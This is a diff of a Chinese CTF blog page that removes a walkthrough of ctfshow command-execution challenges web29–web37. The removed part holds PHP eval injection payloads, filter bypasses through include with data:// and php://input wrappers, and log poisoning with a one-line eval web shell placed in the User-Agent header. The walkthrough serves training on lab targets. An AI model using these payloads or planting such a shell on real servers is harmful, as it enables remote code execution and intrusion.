@@ -26,14 +26,10 @@
 <meta property="og:site_name" content="MaskObito">
 <meta property="og:description" content="命令执行常见函数：12345678system()    &#x2F;&#x2F; 执行外部程序并显示输出exec()      &#x2F;&#x2F; 执行外部程序passthru()  &#x2F;&#x2F; 执行外部程序并显示原始输出shell_exec() &#x2F;&#x2F; 通过shell执行命令&#96;&#96; &#96;&#96;(反引号)    &#x2F;&#x2F; 执行shell命令popen()     &#x2F;&#x2F; 打开进程文件指针proc_open() &#x2F;&#x2F; 执行命令并打开文件指针    常用">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://maskobito.github.io/images/web33.png">
-<meta property="og:image" content="http://maskobito.github.io/images/%E8%9A%81%E5%89%911.png">
-<meta property="og:image" content="http://maskobito.github.io/images/%E8%9A%81%E5%89%912.png">
 <meta property="article:published_time" content="2025-01-03T15:45:01.000Z">
-<meta property="article:modified_time" content="2025-09-24T05:53:24.360Z">
+<meta property="article:modified_time" content="2025-09-24T06:50:54.561Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://maskobito.github.io/images/web33.png">
   
   
   
@@ -172,7 +168,7 @@
             <li class="nav-item">
               <a class="nav-link" href="/tags/" target="_self">
                 <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
+                <span>CTF</span>
               </a>
             </li>
           
@@ -184,7 +180,7 @@
             <li class="nav-item">
               <a class="nav-link" href="/about/" target="_self">
                 <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
+                <span>关于本站</span>
               </a>
             </li>
           
@@ -241,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          202 字
         
       </span>
     
@@ -252,7 +248,7 @@
         
         
         
-          14 分钟
+          2 分钟
         
       </span>
     
@@ -319,132 +315,6 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/vuln.php?input=<span class="hljs-built_in">ls</span>|<span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure>
 
 <p>将<code>ls</code>命令的输出进行base64编码</p>
-<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br><br></code></pre></td></tr></table></figure>
-
-<p> 检查 HTTP 请求中是否包含名为 c 的参数。如果存在，执行后续代码；否则，跳到 else 语句。</p>
-<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>]<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure>
-
-<p>获取 HTTP 请求中的 c 参数并将其赋值给变量 $c。 （此处的$c不一定是c，只是更好理解罢了）</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)&#123; <br></code></pre></td></tr></table></figure>
-
-<p>使用 preg_match() 函数对 $c 变量进行正则匹配。这个正则表达式检查 $c 中是否包含不区分大小写的字符串 “flag”。如果 $c 中不包含 “flag”，则继续执行后续代码。</p>
-<p>eval($c); 使用 eval() 函数执行 $c 变量中的代码。eval() 会将 $c 中的字符串作为 PHP 代码执行，这可能导致执行任意 PHP 代码，从而形成安全漏洞。</p>
-<p>eval($_GET[2])：</p>
-<ul>
-<li><code>eval()</code> 执行字符串作为 PHP 代码。</li>
-<li><code>$_GET[2]</code> 从 URL 参数 <code>2</code> 获取值（如 <code>&amp;2=system(...)</code>）。</li>
-<li>这允许 <strong>动态执行任意命令</strong>，无需修改 User-Agent 反复注入。</li>
-</ul>
-<p>} 结束 if(!preg_match(“&#x2F;flag&#x2F;i”, $c)) 语句的判断。</p>
-<p>}else{ 如果 $_GET[‘c’] 不存在（即 c 参数没有传递），则执行以下代码。</p>
-<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">highlight_file</span>(FILE); <br></code></pre></td></tr></table></figure>
-
-<p>highlight_file() 函数将当前 PHP 文件的源代码高亮显示。FILE 是一个常量，它表示当前脚本的文件路径。这意味着如果没有 c 参数，脚本将显示自身的源代码。</p>
-<p>} 结束else语句块</p>
-<p>尝试url&#x2F;?c&#x3D;system(‘ls’);（<strong>闭合标签<code>?&gt;</code></strong>：当PHP遇到<code>?&gt;</code>时，会<strong>自动在结尾插入分号</strong>（称为”隐含分号”），因此<code>system(&#39;ls&#39;)?&gt;</code>等价于<code>system(&#39;ls&#39;);</code>）</p>
-<p>当程序执行到 system(‘ls’) 时，会调用系统的 Shell（如 Bash），运行 ls 命令，列出当前目录下的文件和文件夹（相当于在终端直接输入 ls）。</p>
-<p>得到</p>
-<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag.php <span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure>
-
-<h4 id="cat：正序，查看-合并文件"><a href="#cat：正序，查看-合并文件" class="headerlink" title="cat：正序，查看&#x2F;合并文件"></a>cat：正序，查看&#x2F;合并文件</h4><h4 id="tac：倒序，查看日志时，优先显示最新行"><a href="#tac：倒序，查看日志时，优先显示最新行" class="headerlink" title="tac：倒序，查看日志时，优先显示最新行"></a>tac：倒序，查看日志时，优先显示最新行</h4><p>本题flag被ban，用通配符*，访问?c&#x3D;system(‘tac fla*.php’);得到flag，访问?c&#x3D;system(‘cat fla*.php’);无显示，查看源代码得到flag</p>
-<p><strong>tac</strong>：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">flag = <span class="hljs-string">&#x27;ctfshow&#123;7b9e92b8-e4c5-4478-a9eb-e4a8862691a5&#125;&#x27;</span>;</span><br><br>*/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@<span class="hljs-built_in">link</span>: https://ctfer.com</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@email: h1xa@ctfer.com</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Last Modified <span class="hljs-keyword">time</span>: 2020-09-04 00:14:17</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Last Modified by:   h1xa</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Date:   2020-09-04 00:14:07</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Author: h1xa</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-*- coding: utf-8 -*-</span><br>/*<br><br>&lt;?php<br></code></pre></td></tr></table></figure>
-
-<p>输出顺序：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;/html&gt;       <span class="hljs-comment">// 浏览器认为文档已结束</span><br>...<br>&lt;html&gt;        <span class="hljs-comment">// 被当作普通文本</span><br><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">// 全部当作文本显示</span><br></code></pre></td></tr></table></figure>
-
-<p>→ Flag直接可见</p>
-<p><strong>cat</strong>（源代码）：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:14:07</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:14:17</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;ctfshow&#123;c78ff3fc-09d6-4aa0-9b59-689b0eefebd3&#125;&#x27;</span>;<br><br></code></pre></td></tr></table></figure>
-
-<p>输出顺序：</p>
-<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span></span><span class="language-xml">  // PHP引擎执行，可能抑制输出</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>        // 浏览器开始解析</span><br><span class="language-xml">...</span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- flag --&gt;</span> // 可能被隐藏</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p><em>!preg_match(“&#x2F;flag|system|php&#x2F;i”, $c</em></p>
-<p>用<strong>passthru</strong>代替<strong>system</strong></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;tac fla*.ph*&#x27;</span>);<br></code></pre></td></tr></table></figure>
-
-<p>通配符：?匹配单个字符，*匹配任何数量字符，可以是0</p>
-<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51213906/article/details/123010661">PHP-RCE绕过的姿势总结_rce如何绕过对system的过滤-CSDN博客</a></p>
-<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p><em>if(!preg_match(“&#x2F;flag|system|php|cat|sort|shell|.| |&#39;|`|echo|;|(&#x2F;i”, $c)){</em> </p>
-<p>先尝试用?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;system(‘ls’);</p>
-<ul>
-<li>原始代码：<code>include$_GET[1]?&gt;</code><ul>
-<li><code>?&gt;</code> 是PHP的闭合标签，表示PHP代码结束。后续内容（<code>&amp;1=data://...</code>）会被视为普通文本（非PHP代码）。</li>
-</ul>
-</li>
-<li>若替换为<code>include$_GET[1];</code>：<ul>
-<li>分号<code>;</code>表示语句结束，但<strong>缺少空格</strong>导致语法错误。PHP会将<code>include$_GET[1]</code>视为一个未定义的常量（而非<code>include</code>关键字），从而报错。</li>
-</ul>
-</li>
-</ul>
-<p>payload：<code>url/?c=include $_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p>
-<p>区别在于<code>1</code>参数的值：</p>
-<ul>
-<li>失败案例：纯字符串 <code>system(&#39;ls&#39;);</code></li>
-<li>成功案例：<code>data://</code>协议封装的数据流</li>
-</ul>
-<h4 id="include语句的工作机制"><a href="#include语句的工作机制" class="headerlink" title="include语句的工作机制"></a><strong><code>include</code>语句的工作机制</strong></h4><p>当执行 <code>include $_GET[1]</code> 时：</p>
-<ol>
-<li>PHP会尝试将 <code>$_GET[1]</code> 的值作为<strong>文件路径</strong>处理</li>
-<li>读取该路径的内容</li>
-<li>将内容当作PHP代码执行</li>
-</ol>
-<h4 id="失败案例解析"><a href="#失败案例解析" class="headerlink" title="失败案例解析"></a><strong>失败案例解析</strong></h4><p>payload1实际执行：<code>include &quot;system(&#39;ls&#39;);&quot;</code></p>
-<p>PHP行为：</p>
-<ol>
-<li>尝试打开名为 <code>system(&#39;ls&#39;);</code> 的文件</li>
-<li>文件系统不存在此文件 → 触发警告</li>
-<li>最终执行的是文件内容（空），而非代码</li>
-</ol>
-<p>payload2实际执行：<code>include &quot;data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;&quot;</code></p>
-<p>PHP行为：</p>
-<ol>
-<li>识别<code>data://</code>协议处理器</li>
-<li>解码数据流：<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code></li>
-<li><strong>执行其中的PHP代码</strong> → 运行<code>system(&#39;ls&#39;)</code></li>
-</ol>
-<p>绕过后的payload:<code>url/?c=include%0a$_GET[1]?&gt;&amp;1=data://text/plain/,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p>
-<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>同web32，重点再写一遍<strong>一句话木马</strong>，并尝试用蚁剑连接。</p>
-<p><img src="/images/web33.png" srcset="/img/loading.gif" lazyload></p>
-<ol>
-<li><p>url加上&#x2F;index.php(嫌麻烦可以跳过)</p>
-</li>
-<li><p>post传参a&#x3D;1(a不要与题目中参数一样)</p>
-</li>
-<li><p>抓包</p>
-</li>
-<li><p>UA头加上**<code>&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;</code>**</p>
-</li>
-<li><p>index.php改为实际路径，如&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，即</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure>
-</li>
-<li><p>也可以用<strong>c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>来绕过waf。</p>
-</li>
-<li><p>post参数改为</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">shell=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br></code></pre></td></tr></table></figure></li>
-</ol>
-<p>发包发现已经得到想要的结果。</p>
-<p><img src="/images/%E8%9A%81%E5%89%911.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/images/%E8%9A%81%E5%89%912.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><p>仔细发现可以利用include进行绕过, 具体实现方式为 <code>eval(include flag.php;);</code></p>
-<p>GET：<code>?c=include$_GET[1]?&gt;&amp;1=php://input</code></p>
-<p>POST：<code>&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></p>
-<p>需要注意,因为POST没有按照key&#x3D;value封装数据, 因此hackBar认为数据有问题, 不会发送数据, 可以使用Burp Suite发送数据</p>
-<p>补充:    <code>php://input</code>默认读取没有处理过的POST数据</p>
-<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><h4 id="可用伪协议"><a href="#可用伪协议" class="headerlink" title="可用伪协议"></a>可用伪协议</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span>%0A<span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
-
-<h4 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?%<span class="hljs-number">3</span>E&amp;a=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>var<span class="hljs-regexp">/log/</span>nginx/access.log<br></code></pre></td></tr></table></figure>
-
-<p>在ua头加入一句话木马即可</p>
-<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>利用伪协议</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=<br></code></pre></td></tr></table></figure>
-
-<p>或</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?c=data:<span class="hljs-regexp">//</span>text/plain,<span class="hljs-variable">%3C</span>?=<span class="hljs-keyword">system</span>(<span class="hljs-variable">%2</span>2tac<span class="hljs-variable">%20f</span>*<span class="hljs-variable">%22</span>)?<span class="hljs-variable">%3E</span><br></code></pre></td></tr></table></figure>
-
 
                 
               </div>
@@ -528,9 +398,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/01/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">
+                      <a href="/2025/01/03/CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">文件包含</span>
+                        <span class="hidden-mobile">命令执行</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -538,7 +408,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/01/02/sql%E6%B3%A8%E5%85%A5%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/" title="sql注入">
+                      <a href="/2025/01/02/CTF-sql%E6%B3%A8%E5%85%A5/" title="sql注入">
                         <span class="hidden-mobile">sql注入</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
